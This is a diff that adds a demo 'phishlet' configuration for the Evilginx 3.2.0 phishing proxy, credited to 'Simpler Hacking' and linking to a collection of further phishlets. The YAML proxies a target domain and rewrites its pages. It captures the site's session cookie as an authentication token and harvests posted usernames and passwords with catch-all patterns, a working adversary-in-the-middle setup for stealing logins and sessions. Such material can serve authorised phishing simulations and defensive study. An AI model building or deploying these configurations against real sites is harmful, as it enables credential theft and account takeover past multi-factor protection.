@@ -1,0 +1,35 @@
+name: 'Your First Phishlet'
+author: 'Simpler Hacking'
+min_ver: '3.2.0'
+
+proxy_hosts:
+  - { phish_sub: 'www', orig_sub: 'www', domain: '{domain}', session: true, is_landing: true }
+
+sub_filters: 
+  - { hostname: '{hostname}', sub: 'www', domain: '{domain}', search: '{domain}', replace: '{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'application/xml', 'image/*', 'font/*']} 
+  - { hostname: '{hostname}', sub: 'www', domain: '{domain}', search: '{domain}', replace: '{hostname}', mimes: ['application/x-www-form-urlencoded']}
+
+auth_tokens:
+  - domain: '{domain}'
+    keys: ['session']
+
+creds:
+  - key: 'username'
+    search: ['(.*)']
+    type: 'post'
+  - key: 'password'
+    search: ['(.*)']
+    type: 'post'
+
+auth_urls:
+  - url_regex: 'https://{hostname}/login'
+    valid_statuses: [200]
+
+login:
+  username: user
+  password: pass
+  url: https://www.{domain}/login
+
+# This is just a demo example of a phishlet for 3.2.0
+
+# You can find phishlets here: https://github.com/simplerhacking/Evilginx3-Phishlets & www.simplerhacking.com
